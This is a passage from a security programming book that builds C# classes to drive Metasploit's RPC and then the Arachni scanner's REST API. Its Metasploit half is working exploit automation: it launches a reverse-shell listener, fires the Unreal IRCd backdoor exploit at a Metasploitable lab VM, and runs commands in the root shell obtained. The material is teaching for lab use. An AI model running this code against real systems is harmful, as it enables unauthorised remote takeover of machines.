close the Add New Repository dialog by clicking Close.\nWith the new repository installed, you can install the NuGet package\nmanager easily. After closing the repository dialog, you should be back\non the Gallery tab in the Add-in Manager. In the top-right corner of the\nAdd-in Manager is a text box for searching possible add-ins to install. Enter\nnuget into this box; it should filter the packages to show you the NuGet pack-\nage manager. Select the NuGet extension and then click the Install button\n(see Figure 11-1).\nFigure 11-1: The MonoDevelop Add-in Manager installing NuGet\n210 Chapter 11\nInstalling the MSGPACK Library\nNow that the NuGet package manager is installed, we can install our\nMSGPACK library. There is a small hitch, though. The best version of\nthe MSGPACK library to install for MonoDevelop is 0.6.8 (for compatibility\npurposes), but the NuGet manager in MonoDevelop doesn’t allow us to\nspecify a version and will try to install the latest version. We need to add a\npackages.config file manually to the project that specifies the version of the\nlibrary we want, as shown in Listing 11-3. Right-click the Metasploit project\nin the Solution Explorer in MonoDevelop, Xamarin Studio, or Visual Studio.\nFrom the menu that appears, select Add4New File and add a new file called\npackages.config.\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<packages>\n<package id=\"MsgPack.Cli\" version=\"0.6.8\" targetFramework=\"net45\" />\n</packages>\nListing 11-3: The packages .config file specifying the correct version of the MsgPack.Cli\nlibrary\nAfter creating the packages.config file, restart MonoDevelop and open\nthe project you created to run the Metasploit code we’ll soon write. You\nshould now be able to right-click the project references and click the\nRestore NuGet Packages menu item, which will ensure the packages in\nthe packages.config file are installed with the correct versions.\nReferencing the MSGPACK Library\nWith the correct version of the MSGPACK library installed, we can now add it\nas a reference to the project so we can start writing some code. Usually NuGet\nwould handle this for us, but this is a small bug in MonoDevelop that we must\nwork around. Right-click the References folder in your MonoDevelop solu-\ntion pane and select Edit References... (see Figure 11-2).\nFigure 11-2: The Edit References… menu item\nin the solution pane\nThe Edit References dialog should come up with a few tabs available,\nas shown in Figure 11-3. You want to select the .Net Assembly tab and then\nAutomating Metasploit 211\nnavigate to the MsgPack.dll assembly in the packages folder in the root of the\nproject. This packages folder was created by NuGet automatically when you\ndownloaded the MSGPACK library.\nFigure 11-3: The Edit References dialog\nAfter finding the MsgPack.dll library, select it and click OK in the\nbottom-right corner of the dialog. This should add the MsgPack.dll library\nto your project so that you can begin using the classes and referencing the\nlibrary in your C# source files.\nwriting the MetasploitSession Class\nNow we need to build a MetasploitSession class to communicate with the\nRPC server, as shown in Listing 11-4.\npublic class MetasploitSession : IDisposable\n{\nstring _host;\nstring _token;\npublic MetasploitSession(ustring username, string password, string host)\n{\n_host = host;\n_token = null;\nDictionary<object, object> response = this.vAuthenticate(username, password);\nwbool loggedIn = !response.ContainsKey(\"error\");\nif (!loggedIn)\nxthrow new Exception(response[\"error_message\"] as string);\n212 Chapter 11\nyif ((response[\"result\"] as string) == \"success\")\n_token = response[\"token\"] as string;\n}\npublic string zToken\n{\nget { return _token; }\n}\npublic Dictionary<object, object> Authenticate(string username, string password)\n{\nreturn this.{Execute(\"auth.login\", username, password);\n}\nListing 11-4: The MetasploitSession class constructor, Token property, and Authenticate() method\nThe MetasploitSession constructor takes three arguments, as shown at u:\nthe username and password to authenticate with and the host to connect\nto. We call Authenticate() v with the supplied username and password and\nthen test for authentication by checking whether the response contains an\nerror w. If the authentication fails, an exception is thrown x. If authentica-\ntion succeeds, we assign the _token variable with the value of the authen-\ntication token returned by the RPC y and make the Token z public. The\nAuthenticate() method calls the Execute() method {, passing in auth.login\nas the RPC method along with the username and password.\nCreating the Execute() Method for HTTP Requests and\nInteracting with MSGPACK\nThe Execute() method shown in Listing 11-5 does the bulk of the work of the\nRPC library, creating and sending HTTP requests and serializing the RPC\nmethods and arguments into MSGPACK.\npublic Dictionary<object, object> Execute(string method, params object[] args)\n{\nif u(method != \"auth.login\" && string.IsNullOrEmpty(_token))\nthrow new Exception(\"Not authenticated.\");\nHttpWebRequest request = (HttpWebRequest)WebRequest.Create(_host);\nrequest.ContentType = v\"binary/message-pack\";\nrequest.Method = \"POST\";\nrequest.KeepAlive = true;\nusing (Stream requestStream = request.GetRequestStream())\nusing (Packer msgpackWriter = wPacker.Create(requestStream))\n{\nbool sendToken = (!string.IsNullOrEmpty(_token) && method != \"auth.login\");\nmsgpackWriter.xPackArrayHeader(1 + (sendToken ? 1 : 0) + args.Length);\nmsgpackWriter.Pack(method);\nif (sendToken)\nmsgpackWriter.Pack(_token);\nAutomating Metasploit 213\nyforeach (object arg in args)\nmsgpackWriter.Pack(arg);\n}\nzusing (MemoryStream mstream = new MemoryStream())\n{\nusing (WebResponse response = request.GetResponse())\nusing (Stream rstream = response.GetResponseStream())\nrstream.CopyTo(mstream);\nmstream.Position = 0;\nMessagePackObjectDictionary resp =\nUnpacking.{UnpackObject(mstream).AsDictionary();\nreturn MessagePackToDictionary(resp);\n}\n}\nListing 11-5: The MetasploitSession class’s Execute() method\nAt u, we check whether auth.login was passed as the RPC method,\nwhich is the only RPC method that doesn’t require authentication. If the\nmethod is not auth.login and we have no authentication token set, we\nthrow an exception because the command passed to be executed will fail\nwithout authentication.\nOnce we know that we have the authentication necessary to make the\nAPI HTTP request, we set the ContentType to binary/message-pack v so that\nthe API knows we are sending it MSGPACK data in the HTTP body. We\nthen create a Packer class by passing the HTTP request stream to the\nPacker.Create() method w. The Packer class (defined in the MsgPack.Cli\nlibrary) is a real time-saver that allows us to write our RPC method and\narguments to the HTTP request stream. We’ll use the various packing\nmethods in the Packer class to serialize and write the RPC methods and\narguments to the request stream.\nWe write the total number of pieces of information we are writing to\nthe request stream using PackArrayHeader() x. For example, the auth.login\nmethod has three pieces of information: the method name and the two\narguments username and password. We would first write the number 3 onto the\nstream. Then we would write the strings auth.login, username, and p assword\nto the stream using Pack. We’ll use this general process of serializing and\nsending the API method and arguments as the HTTP body to send our\nAPI requests to the Metasploit RPC.\nHaving written the RPC method to the request stream, we write the\nauthentication token if necessary. We then move on to packing the RPC\nmethod arguments in a foreach loop y to finish the HTTP request making\nthe API call.\nThe rest of the Execute() method reads the HTTP response that is seri-\nalized with MSGPACK and converts it into C# classes that we can use. We\nfirst read the response into a byte array using a MemoryStream() z. We then\n214 Chapter 11\ndeserialize the response with UnpackObject() {, passing the byte array as the\nonly argument and returning the object as a MSGPACK dictionary. This\nMSGPACK dictionary isn’t exactly what we want, though. The values con-\ntained in the dictionary—such as strings—all need to be converted to their\nC# class counterparts so that we can easily use them. To do this, we pass the\nMSGPACK dictionary to the MessagePackToDictionary() method (discussed in\nthe next section).\nTransforming Response Data from MSGPACK\nThe next few methods are mainly used to transform the API responses\nfrom Metasploit in the MSGPACK format into C# classes we can use more\neasily.\nConverting an MSGPACK Object to a C# Dictionary with MessagePackToDictionary()\nThe MessagePackToDictionary() method shown in Listing 11-6 was intro-\nduced at the end of Listing 11-5 in the Execute() method. It accepts a\nMessagePackObjectDictionary and converts it into a C# dictionary (a class for\nholding key/value pairs), which is a close equivalent to a Ruby or Python hash.\nDictionary<object,object> MessagePackToDictionary(uMessagePackObjectDictionary dict)\n{\nDictionary<object, object> newDict = new vDictionary<object, object>();\nforeach (var pair in wdict)\n{\nobject newKey = xGetObject(pair.Key);\nif (pair.Value.IsTypeOf<MessagePackObjectDictionary>() == true)\nnewDict[newKey] = MessagePackToDictionary(pair.Value.AsDictionary());\nelse\nnewDict[newKey] = yGetObject(pair.Value);\n}\nzreturn newDict;\n}\nListing 11-6: The MessagePackToDictionary() method\nThe MessagePackToDictionary() method takes a single argument u, the\nMSGPACK dictionary we want to convert to a C# dictionary. Once we’ve\ncreated the C# dictionary v, we’ll put our converted MSGPACK objects\nin it by iterating over each key/value pair from the MSGPACK dictionary\npassed as the argument to the method w. First, we’ll get a C# object for\nthe given key of the current loop iteration x, and then we’ll test the cor-\nresponding value to determine how best to deal with it. For example, if the\nvalue is a dictionary, we introduce recursion into the method by calling\nMessagePackToDictionary(). Otherwise, if the value isn’t another dictionary, we\nconvert it to its corresponding C# type with GetObject(), which we’ll define\nlater y. Finally, we return the new dictionary z with the C# types instead\nof MSGPACK types.\nAutomating Metasploit 215\nConverting an MSGPACK Object to a C# Object with GetObject()\nListing 11-7 shows how we implement the GetObject() method shown at x\nin Listing 11-6. This method accepts a MessagePackObject, converts it into its\nC# class, and returns the new object.\nprivate object GetObject(MessagePackObject str)\n{\nuif (str.UnderlyingType == typeof(byte[]))\nreturn System.Text.Encoding.ASCII.GetString(str.AsBinary());\nelse if (str.UnderlyingType == typeof(string))\nreturn str.AsString();\nelse if (str.UnderlyingType == typeof(byte))\nreturn str.AsByte();\nelse if (str.UnderlyingType == typeof(bool))\nreturn str.AsBoolean();\nvreturn null;\n}\nListing 11-7: The MetasploitSession class’s GetObject() method\nThe GetObject() method checks whether an object is one of a certain\ntype, like a string or a Boolean, and returns the object as the C# type if it\nfinds a match. At u, we convert any MessagePackObject with an UnderlyingType\nthat is an array of bytes to a string and return the new string. Because some\nof the “strings” sent from Metasploit are actually just byte arrays, we must\nconvert these byte arrays to strings in the beginning or we’ll need to cast\nthem to strings whenever we want to use them. Casting often is computa-\ntionally inefficient, so it’s best to just convert all the values up front.\nThe rest of the if statements check for and convert other data types. If\nwe get to the last else if statement and have not been able to return a new\nobject, we return null v. This allows us to test whether the conversion to\nanother type was successful. If null is returned, we must find out why we\ncouldn’t convert the MSGPACK object to another C# class.\nCleaning Up the RPC Session with Dispose()\nThe Dispose() method shown in Listing 11-8 cleans up our RPC session dur-\ning garbage collection.\npublic void Dispose()\n{\nif (this.uToken != null)\n{\nthis.Execute(\"auth.logout\", this.Token);\n_token = null;\n}\n}\nListing 11-8: The MetasploitSession class’s Dispose() method\n216 Chapter 11\nIf our Token property u is not null, we assume we are authenticated, call\nauth.logout and pass the authentication token as the only argument, and\nassign null to the local _token variable.\ntesting the session Class\nNow can test our session class by displaying the version of the RPC (see\nListing 11-9). With the session class working and finished, we can begin really\ndriving Metasploit and move on to exploiting Metasploitable automatically.\npublic static void Main(string[] args)\n{\nstring listenAddr = uargs[0];\nusing (MetasploitSession session = new vMetasploitSession(\"username\",\n\"password\", \"http://\"+listenAddr+\":55553/api\"))\n{\nif (string.IsNullOrEmpty(session.Token))\nthrow new Exception(\"Login failed. Check credentials\");\nDictionary<object, object> version = session.wExecute(\"core.version\");\nConsole.WriteLine(x\"Version: \" + version[\"version\"]);\nConsole.WriteLine(y\"Ruby: \" + version[\"ruby\"]);\nConsole.WriteLine(z\"API: \" + version[\"api\"]);\n}\n}\nListing 11-9: Testing the MetasploitSession class to get version information from the\nRPC interface\nThis small test program expects a single argument: the IP address for\nthe Metasploit host. The first thing we do is assign the first argument to the\nlistenAddr variable u, which is used to create a new MetasploitSession v.\nOnce authenticated, we call the core.version RPC method w to display the\nMetasploit x, Ruby y, and API z versions in use, the output of which is\nshown in Listing 11-10.\n$ ./ch11_automating_metasploit.exe 192.168.0.2\nVersion: 4.11.8-dev-a030179\nRuby: 2.1.6 x86_64-darwin14.0 2015-04-13\nAPI: 1.0\nListing 11-10: Running the MetasploitSession test prints the API, Ruby, and Metasploit\nversion information\nwriting the MetasploitManager Class\nThe MetasploitManager class shown in Listing 11-11 wraps some basic func-\ntionality that we will need in order to drive exploitation programmatically\nvia the RPC, including the ability to list sessions, read session shells, and\nexecute modules.\nAutomating Metasploit 217\npublic class MetasploitManager : IDisposable\n{\nprivate MetasploitSession _session;\npublic MetasploitManager(uMetasploitSession session)\n{\n_session = session;\n}\npublic Dictionary<object, object> vListJobs()\n{\nreturn _session.Execute(\"job.list\");\n}\npublic Dictionary<object, object> StopJob(string jobID)\n{\nreturn _session.Execute(\"job.stop\", jobID);\n}\npublic Dictionary<object, object> wExecuteModule(string moduleType, string moduleName,\nDictionary<object, object> options)\n{\nreturn _session.Execute(\"module.execute\", moduleType, moduleName, options);\n}\npublic Dictionary<object, object> ListSessions()\n{\nreturn _session.Execute(\"session.list\");\n}\npublic Dictionary<object, object> StopSession(string sessionID)\n{\nreturn _session.Execute(\"session.stop\", sessionID);\n}\npublic Dictionary<object, object> xReadSessionShell(string sessionID, int? readPointer = null)\n{\nif (readPointer.HasValue)\nreturn _session.Execute(\"session.shell_read\", sessionID, readPointer.Value);\nelse\nreturn _session.Execute(\"session.shell_read\", sessionID);\n}\npublic Dictionary<object, object> yWriteToSessionShell(string sessionID, string data)\n{\nreturn _session.Execute(\"session.shell_write\", sessionID, data);\n}\npublic void Dispose()\n{\n_session = null;\n}\n}\nListing 11-11: The MetasploitManager class\n218 Chapter 11\nThe MetasploitManager constructor takes a MetasploitSession u as its only\nargument and then assigns the session argument to a local class variable.\nThe rest of the methods in the class simply wrap a specific RPC method that\nwe’ll use to automate the exploitation of Metasploitable 2. For example, we\nuse the ListJobs() method v to monitor our exploit so we know when the\nexploit is finished and we can run a command on the shelled machine.\nWe use the ReadSessionShell() method x to read any output result-\ning from running a command with the session. The WriteToSessionShell()\nmethod y, conversely, writes any commands to the shell to be executed.\nThe ExecuteModule() method w takes a module to execute and the options\nto use when executing the module. Each method uses Execute() to execute\na given RPC method and return the results to the caller. We’ll discuss each\nmethod as we make the finishing touches to drive Metasploit in the next\nsections.\nPutting it all together\nNow we can use our classes to begin automating exploitation via Metasploit.\nFirst, let’s write a Main() method to listen for a connect-back shell and then\nrun an exploit that causes Metasploitable to connect back to our listener\nwith a new session (see Listing 11-12).\npublic static void Main(string[] args)\n{\nustring listenAddr = args[1];\nint listenPort = 4444;\nstring payload = \"cmd/unix/reverse\";\nusing (vMetasploitSession session = new MetasploitSession(\"username\",\n\"password\", \"http://\"+listenAddr+\":55553/api\"))\n{\nif (string.IsNullOrEmpty(session.wToken))\nthrow new Exception(\"Login failed. Check credentials\");\nusing (MetasploitManager manager = new xMetasploitManager(session))\n{\nDictionary<object, object> response = null;\nyDictionary<object, object> opts = new Dictionary<object, object>();\nopts[\"ExitOnSession\"] = false;\nopts[\"PAYLOAD\"] = payload;\nopts[\"LHOST\"] = listenAddr;\nopts[\"LPORT\"] = listenPort;\nresponse = manager.zExecuteModule(\"exploit\", \"multi/handler\", opts);\nobject jobID = response[\"job_id\"];\nListing 11-12: The beginning of the Main() method for automating the MetasploitSession\nand MetasploitManager classes\nAutomating Metasploit 219\nNext, we define a few variables for later use u: the address and port for\nMetasploit to listen on for a connection back and the payload to be sent to\nMetasploitable. Then, we create a new MetasploitSession class v and check\nthe session Token property w to confirm authentication. Once we know that\nwe are authenticated, we pass the session to a new MetasploitManager x so\nthat we can begin exploitation.\nAt y, we create a dictionary to hold the options to send to Metasploit\nwhen we begin listening for a connect-back, namely ExitOnSession, PAYLOAD,\nLHOST, and LPORT. The ExitOnSession option is a Boolean value that dictates\nwhether the listener will stop when a session connects. If this value is true,\nthe listener will stop. If it’s false, the listener will continue to listen for\nnew shells. The PAYLOAD option is a string that tells Metasploit what kind of\nconnect-back payload the listener should expect. LPORT and LHOST are the\nport and the IP address to listen on, respectively. We pass these options\nto the multi/handler exploit module (which listens for a connect-back shell\nfrom Metasploitable) using the ExecuteModule() z, which starts a job to listen\nfor the connect-back shell. The job ID is returned by ExecuteModule() and\nstored for later use.\nRunning the Exploit\nListing 11-13 shows how to add the code to run the actual exploit against\nMetasploitable.\nopts = new Dictionary<object, object>();\nopts[\"RHOST\"] = args[0];\nopts[\"DisablePayloadHandler\"] = true;\nopts[\"LHOST\"] = listenAddr;\nopts[\"LPORT\"] = listenPort;\nopts[\"PAYLOAD\"] = payload;\nmanager.uExecuteModule(\"exploit\", \"unix/irc/unreal_ircd_3281_backdoor\", opts);\nListing 11-13: Running the Unreal IRCD exploit via the RPC\nAs we did earlier, we set up the module datastore options in a diction-\nary before calling ExecuteModule() u and passing it the unix/irc/unreal_ircd_\n3281_backdoor exploit module name and options (see Listing 11-14).\nresponse = manager.uListJobs();\nwhile (response.vContainsValue(\"Exploit: unix/irc/unreal_ircd_3281_backdoor\"))\n{\nConsole.WriteLine(\"Waiting\");\nSystem.Threading.Thread.Sleep(10000);\nresponse = manager.wListJobs();\n}\nresponse = manager.xStopJob(jobID.ToString());\nListing 11-14: Watching until the Unreal IRC exploit is finished running\n220 Chapter 11\nThe ListJobs() method u returns a list of all jobs currently running on\nthe Metasploit instance as a list of strings with the module name in them.\nIf the list contains the name of the module we are running, our exploit\nhasn’t finished, so we need to wait a bit and recheck until our module is\nno longer listed. If ContainsValue() v returns true, then our module is still\nrunning, so we sleep and call ListJobs() w again until the exploit module\nis no longer listed in the jobs, which means it has finished running. Now\nwe should have a shell. Finally, we turn off the multi/handler exploit module\nwith StopJob() x by passing it the job ID we stored earlier.\nInteracting with the Shell\nWe should now be able to interact with the new shell. To test the connec-\ntion, we run a simple command to confirm we have the access we want, as\nshown in Listing 11-15.\nresponse = manager.uListSessions();\nforeach (var pair in response)\n{\nstring sessionID = pair.Key.ToString();\nmanager.vWriteToSessionShell(sessionID, \"id\\n\");\nSystem.Threading.Thread.Sleep(1000);\nresponse = manager.wReadSessionShell(sessionID);\nConsole.WriteLine(\"We are user: \" + response [\"data\"]);\nConsole.WriteLine(\"Killing session: \" + sessionID);\nmanager.xStopSession(sessionID);\n}\n}\n}\n}\nListing 11-15: Retrieving the list of the current sessions and printing the results\nAt u, we call ListSessions(), which returns a list of the session IDs and\ngeneral information about the sessions, such as session type. As we iterate\nover each session (there should only be one, unless you run the exploit\nmultiple times!), we use the WriteToSessionShell() method v to write the id\ncommand to the session shell, then sleep for a bit, and read the response\nusing ReadSessionShell() w. Finally, we write the results of running id on the\ncompromised system and then kill the session with StopSession() x.\nPopping Shells\nNow we can run the automation and pop some easy shells. The program\nmust be run with two arguments: the host to exploit and the IP address\nMetasploit should listen on for shells, as Listing 11-16 shows.\n$ ./ch11_automating_metasploit.exe 192.168.0.18 192.168.0.2\nWaiting\nWaiting\nWaiting\nWaiting\nAutomating Metasploit 221\nWaiting\nWe are user: uuid=0(root) gid=0(root)\nKilling session: 3\n$\nListing 11-16: Running the Unreal IRC exploit automation, showing we have a root shell\nIf everything has worked correctly, we should now have a root shell u,\nand we can run some post-exploitation modules against Metasploitable\nusing C# automation, or perhaps just spin off a few backup shells in case\nthis one goes dark. The post/linux/gather/enum_configs module is a common\npost-exploit module for Linux. You could update your automation to run\nthis or any of the post/linux/gather/enum_* modules after popping the initial\nshell on Metasploitable.\nThis is just the beginning of the very cool things you can drive the\nMeta sploit Framework to do, from discovery to exploitation. As mentioned\nearlier, Metasploit even has a place in post-exploitation with many mod-\nules for several operating systems. You can also drive discovery using the\nauxiliary scanner modules in auxiliary/scanner/*. A neat exercise would be\nto take the cross-platform Metasploit payload we wrote in Chapter 4 and\ndynamically generate shellcode via the RPC and create dynamic payloads.\nConclusion\nIn this chapter, you learned how to create a small set of classes to pro-\ngrammatically drive Metasploit via the RPC interface. Using basic HTTP\nlibraries and a third-party MSGPACK library, we were able to exploit the\nMetasploitable 2 virtual machine with the Unreal IRCD backdoor and then\nrun a command on the shelled machine to prove we had a root shell.\nWe have only touched on the power of the Metasploit RPC in this\nchapter. I highly encourage you to dig deeper into the potential of build-\ning Metasploit into change management or software development life cycle\nprocesses in your corporate environments to ensure misconfigurations or\nvulnerable software is not reintroduced to a data center or network with\nautomatic scanning. At home, you can easily automate new device discov-\nery with the Nmap integration that Metasploit ships with to find any new\nphones or gadgets your kids may not have told you about. The possibilities\nare limitless when it comes to the flexibility and power of the Metasploit\nFramework.\n222 Chapter 11\n12\nau toMa tinG ar aCHni\nArachni is a powerful web application\nblack-box security scanner written in Ruby.\nIt features support for many types of web\napplication vulnerabilities, including many\nof the OWASP Top 10 vulnerabilities (such as XSS\nand SQL injection); a highly scalable distributed\narchitecture that allows you to spin up scanners in a cluster dynamically;\nand full automation through both a remote procedure call (RPC) inter-\nface and a representational state transfer (REST) interface. In this chapter,\nyou’ll learn how to drive Arachni with its REST API and then with its RPC\ninterface to scan a given URL for web application vulnerabilities.\ninstalling arachni\nThe Arachni website (http://www.arachni-scanner.com/) gives you the cur-\nrent download package for Arachni across multiple operating systems. You\ncan use these installers to set up Arachni on your own system. Once you’ve\ndownloaded it, you can test it by running Arachni against a server designed\nto test for web vulnerabilities, as shown in Listing 12-1. Although this com-\nmand isn’t using the RPC to drive Arachni just yet, you can see what kind\nof output we will get when scanning for potential XSS or SQL injection\nvulnerabilities.\n$ arachni --checks xss*,sql* --scope-auto-redundant 2 \\\n\"http://demo.testfire.net/default.aspx\"\nListing 12-1: Running Arachni against an intentionally vulnerable website\nThis command uses Arachni to check for XSS and SQL vulnerabilities\nin the website http://demo.testfire.net/default.aspx. We limit the scope of the\npages it will follow by setting --scope-auto-redundant to 2. Doing so makes\nArachni follow URLs with the same parameters but with different param-\neter values up to twice before moving on to a new URL. Arachni can scan\nmore quickly when a lot of links with the same parameters are available but\nall go to the same page.\nnote For a full introduction to and documentation of the supported vulnerability checks\nin Arachni, visit the Arachni GitHub page detailing the command line arguments:\nhttps://www.github.com/Arachni/arachni/wiki/Command-line-user\n-interface#checks/.\nWithin just a few minutes (depending on your internet speed), Arachni\nshould report back a handful of XSS and SQL injection vulnerabilities in\nthe website. Don’t worry—they’re supposed to be there! This website was\nbuilt to be vulnerable. Later in the chapter, when testing our custom C#\nautomation, you can use this list of XSS, SQL injection, and other vulner-\nabilities to ensure your automation is returning the correct results.\nBut let’s say you want to automatically run Arachni against an arbitrary\nbuild of your web application as part of a secure software development life\ncycle (SDLC). Running it by hand isn’t very efficient, but we can easily auto-\nmate Arachni to kick off scan jobs so it can work with any continuous inte-\ngration system to pass or fail builds depending on the results of the scans.\nThat’s where the REST API comes in.\nthe arachni reSt aPi\nRecently, a REST API was introduced so that simple HTTP requests can be\nused to drive Arachni. Listing 12-2 shows how to start this API.\n$ arachni_rest_server\nArachni - Web Application Security Scanner Framework v2.0dev\nAuthor: Tasos \"Zapotek\" Laskos <tasos.laskos@arachni-scanner.com>\n(With the support of the community and the Arachni Team.)\nWebsite: http://arachni-scanner.com\n224 Chapter 12\nDocumentation: http://arachni-scanner.com/wiki\nu[*] Listening on http://127.0.0.1:7331\nListing 12-2: Running the Arachni REST server\nWhen you start the server, Arachni will output some information about\nitself, including the IP address and port it is listening on u. Once you know\nthe server is working, you can start using the API.\nWith the REST API, you can start a simple scan using any common\nHTTP utility such as curl or even netcat. In this book, we’ll use curl as we\nhave in previous chapters. Our first scan is shown in Listing 12-3.\n$ curl -X POST --data '{\"url\":\"http://demo.testfire.net/default.aspx\"}'u \\\nhttp://127.0.0.1:7331/scans\n{\"id\":\"b139f787f2d59800fc97c34c48863bed\"}v\n$ curl http://127.0.0.1:7331/scans/b139f787f2d59800fc97c34c48863bedw\n{\"status\":\"done\",\"busy\":false,\"seed\":\"676fc9ded9dc44b8a32154d1458e20de\",\n--snip--\nListing 12-3: Testing the REST API with curl\nTo kick off a scan, all we need to do is make a POST request with some\nJSON in the request body u. We start a new Arachni scan by passing JSON\nwith the URL to scan using the --data argument from curl and send that\nto the /scans endpoint. The ID of the new scan is returned in the HTTP\nresponse v. After creating the scan, we can also retrieve the current scan\nstatus and results with a simple HTTP GET request (the default request\ntype for curl) w. We do this by calling on the IP address and port Arachni\nis listening on and appending the ID we obtained when creating the scan\nfor the scans request to the /scans/ URL endpoint. After the scan finishes,\nthe scan log will contain any vulnerabilities found during scanning, such as\nXSS, SQL injection, and other common web application vulnerabilities.\nOnce this is done and we have an idea of how the REST API works, we\ncan start writing the code that will allow us to use the API to scan any site\nwe have an address for.\nCreating the ArachniHTTPSession Class\nAs in previous chapters, we will implement both a session and a manager\nclass to interact with the Arachni API. Currently, these classes are relatively\nsimple, but breaking them out now allows greater flexibility should the API\nrequire authentication or extra steps in the future. Listing 12-4 details the\nArachniHTTPSession class.\npublic class ArachniHTTPSession\n{\npublic uArachniHTTPSession(string host, int port)\n{\nthis.Host = host;\nthis.Port = port;\n}\nAutomating Arachni 225\npublic string Host { get; set; }\npublic int Port { get; set; }\npublic JObject vExecuteRequest(string method, string uri, JObject data = null)\n{\nstring url = \"http://\" + this.Host + \":\" + this.Port.ToString() + uri;\nHttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);\nrequest.Method = method;\nif (data != null)\n{\nstring dataString = data.ToString();\nbyte[] dataBytes = System.Text.Encoding.UTF8.GetBytes(dataString);\nrequest.ContentType = \"application/json\";\nrequest.ContentLength = dataBytes.Length;\nrequest.GetRequestStream().Write(dataBytes, 0, dataBytes.Length);\n}\nstring resp = string.Empty;\nusing (StreamReader reader = new StreamReader(request.GetResponse().GetResponseStream()))\nresp = reader.ReadToEnd();\nreturn JObject.Parse(resp);\n}\n}\nListing 12-4: The ArachniHTTPSession class\nAt this point in the book, the ArachniHTTPSession class should be fairly\nsimple to read and understand, so we won’t go too deep into the code.\nWe create a constructor u that accepts two arguments—the host and port\nto connect to—and assigns the values to the corresponding properties.\nWe then create a method to execute a generic HTTP request v based on\nthe parameters passed to the method. The ExecuteRequest() method should\nreturn a JObject with any data that will be returned by a given API endpoint.\nBecause the ExecuteRequest() method can be used to make any API call\nagainst Arachni, the only thing we can expect is that the response will be\nJSON that can be parsed from the server’s response into a JObject.\nCreating the ArachniHTTPManager Class\nThe ArachniHTTPManager class should also seem simple at this point, as\nListing 12-5 shows.\npublic class ArachniHTTPManager\n{\nArachniHTTPSession _session;\npublic uArachniHTTPManager(ArachniHTTPSession session)\n{\n_session = session;\n}\n226 Chapter 12\npublic JObject vStartScan(string url, JObject options = wnull)\n{\nJObject data = new JObject();\ndata[\"url\"] = url;\ndata.Merge(options);\nreturn _session.ExecuteRequest(\"POST\", \"/scans\", data);\n}\npublic JObject xGetScanStatus(Guid id)\n{\nreturn _session.ExecuteRequest(\"GET\", \"/scans/\" + id.ToString (\"N\"));\n}\n}\nListing 12-5: The ArachniHTTPManager class\nOur ArachniHTTPManager constructor u accepts a single argument—the\nsession to use for executing requests—and then assigns the session to a\nlocal private variable for use later. We then create two methods: StartScan() v\nand GetScanStatus() x. These methods are all we need to create a small tool\nto scan and report on a URL.\nThe StartScan() method accepts two arguments, one of which is optional\nwith a default value of null w. By default, you can just specify a URL with\nno scan options to StartScan(), and Arachni will simply spider the site with-\nout checking for vulnerabilities—a feature that could give you an idea of\nhow much surface area the web application has (that is, how many pages and\nforms there are to test). However, we actually want to specify extra argu-\nments to tune the Arachni scan, so we’ll go ahead and merge those options\ninto our data JObject, and then we’ll POST the scan details to the Arachni\nAPI and return the JSON sent back. The GetScanStatus() method makes a\nsimple GET request, using the ID of the scan passed into the method in the\nURL of the API, and then returns the JSON response to the caller.\nPutting the Session and Manager Classes together\nWith both of the classes implemented, we can start scanning, as Listing 12-6\nshows.\npublic static void Main(string[] args)\n{\nArachniHTTPSession session = new ArachniHTTPSession(\"127.0.0.1\", 7331);\nArachniHTTPManager manager = new ArachniHTTPManager(session);\nuJObject scanOptions = new JObject();\nscanOptions[\"checks\"] = new JArray() { \"xss*\", \"sql*\" } ;\nscanOptions[\"audit\"] = new JObject();\nscanOptions[\"audit\"][\"elements\"] = new JArray() { \"links\", \"forms\" };\nstring url = \"http://demo.testfire.net/default.aspx\";\nAutomating Arachni 227\nJObject scanId = manager.vStartScan(url, scanOptions);\nGuid id = Guid.Parse(scanId[\"id\"].ToString());\nJObject scan = manager.wGetScanStatus(id);\nwhile (scan[\"status\"].ToString() != \"done\")\n{\nConsole.WriteLine(\"Sleeping a bit until scan is finished\");\nSystem.Threading.Thread.Sleep(10000);\nscan = manager.GetScanStatus(id);\n}\nxConsole.WriteLine(scan.ToString());\n}\nListing 12-6: Driving Arachni with the ArachniHTTPSession and ArachniHTTPManager classes\nAfter instantiating our session and manager classes, we create a new\nJObject u to store our scan options in. These options directly correlate with\nthe command line options you see from the Arachni tool when running\narachni –help (there’s a lot). By storing a JArray with the values xss* and sql*\nin the checks option key, we tell Arachni to run XSS and SQL injection tests\nagainst the website, rather than simply spidering the application and find-\ning all possible pages and forms. The audit option key just below that tells\nArachni to audit links it finds and any HTML forms for checks we tell it to run.\nAfter setting up the scan options, we start the scan by calling the\nStartScan() method v and passing our test URL as the argument. Using\nthe ID returned by StartScan(), we retrieve the current scan status with\nGetScanStatus() w and then loop until the scan is finished, checking every\nsecond for a new scan status. Once this is finished, we print the JSON scan\nresults to the screen x.\nThe Arachni REST API is simple and easily accessible to most security\nengineers or hobbyists since it can be used with basic command line tools.\nIt is also highly automatable using the most common C# libraries, and it\nshould be an easy introduction for an SDLC or for general automatic use\non your own websites for weekly or monthly scans. For some extra fun, try\nrunning Arachni with your automation against previous web applications\nfrom the book with known vulnerabilities, such as BadStore. Now that we’ve\nlooked at the Arachni API, we can discuss how to automate its RPC.\nthe arachni rPC\nThe Arachni RPC protocol is a bit more advanced than the API, but it’s also\nmore powerful. Although also powered by MSGPACK, just like Metasploit’s\nRPC, Arachni’s protocol has a twist. The data is sometimes Gzip compressed\nand is only communicated over a regular TCP socket, not HTTP. This com-\nplexity has its benefits: the RPC is blazingly fast without the HTTP overhead,\nand it gives you more scanner management power than the API, includ-\ning the abilities to spin scanners up and down at will and create distributed\n228 Chapter 12\nscanning clusters, thus allowing clusters of Arachni to balance scanning\nacross multiple instances. Long story short, the RPC is very powerful, but\nexpect more development focus and support for the REST API because it is\nmore accessible to most developers.\nManually Running the RPC\nTo start an RPC listener, we use the simple script arachni_rpcd, as shown in\nListing 12-7.\n$ arachni_rpcd\nArachni - Web Application Security Scanner Framework v2.0dev\nAuthor: Tasos \"Zapotek\" Laskos <tasos.laskos@arachni-scanner.com>\n(With the support of the community and the Arachni Team.)\nWebsite: http://arachni-scanner.com\nDocumentation: http://arachni-scanner.com/wiki\nI,[2016-01-16T18:23:29.000746 #18862] INFO - System: RPC Server started.\nI,[2016-01-16T18:23:29.000834 #18862] INFO - System: Listening on u127.0.0.1:7331\nListing 12-7: Running the Arachni RPC server\nNow we can test the listener using another script shipped with Arachni\ncalled arachni_rpc. Note the dispatcher URL u 